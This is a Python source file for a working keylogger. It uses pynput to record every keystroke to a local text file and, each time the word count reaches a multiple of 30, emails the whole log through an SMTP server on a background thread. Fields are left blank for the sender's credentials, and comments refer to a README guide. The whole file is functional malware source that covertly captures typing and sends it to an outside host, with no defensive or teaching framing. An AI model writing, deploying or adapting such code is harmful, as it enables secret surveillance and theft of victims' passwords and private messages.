
# ---------- LIBRARY ----------
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Thread

# ---------- BackSpace Function (canc key)----------
def backspace():
    with open('keyloggerlog.txt', "r+") as file:
        content = file.read()
        new_content = content[:-1]  
        file.seek(0) 
        file.write(new_content)
        file.truncate()

# ---------- Send Mail Function with smtp library ----------
def send_email(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password):
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        # Email sent successfully
    except Exception as e:
        pass
        # An error occurred


def content_file():
    file_path = "keyloggerlog.txt"  # insert path of your keyloggerlog.txt file
    file_content = ""

    with open(file_path, "r") as file:
        file_content = file.read()

    return file_content

# ---------- Registrator Function ----------
def on_key_press(key):
    
    x = 0
    try:
        key_char = key.char
        key_char = str(key_char)
    except AttributeError:
        key_char = key
        key_char = str(key_char)
        if "Key.space" in key_char:
            key_char = ' '
        if "Key.backspace" in key_char:
            key_char = ''
            backspace()
        if "Key.enter" in key_char:
            key_char = '\n'    
# ---------- This function insert actual key in the file ----------
    with open('keyloggerlog.txt','a') as file:
        file.write(key_char)

# ---------- Count the words and at 30 send the mail ----------
    with open('keyloggerlog.txt','r') as file:
        for line in file:
            words = line.split()
            x += len(words)
    if x%30 == 0:
        if __name__ == "__main__":
            subject = "Keylogger log"        # Mail Subject
            message = content_file()         # Mail message (file keylogger)
            from_email = ""                  # From 
            to_email = ""                    # To
            smtp_server = "smtp.example.com" # SMTP server (for example gmail)
            smtp_port = 587                  # Port (default 587)
            smtp_username = ""               # SMTP username
            smtp_password = ""               # SMTP password (guide in README)

            # Start functions in background
            email_thread = Thread(target=send_email, args=(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password))
            email_thread.start()

            print("Email sending process started in the background.")
    

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
    
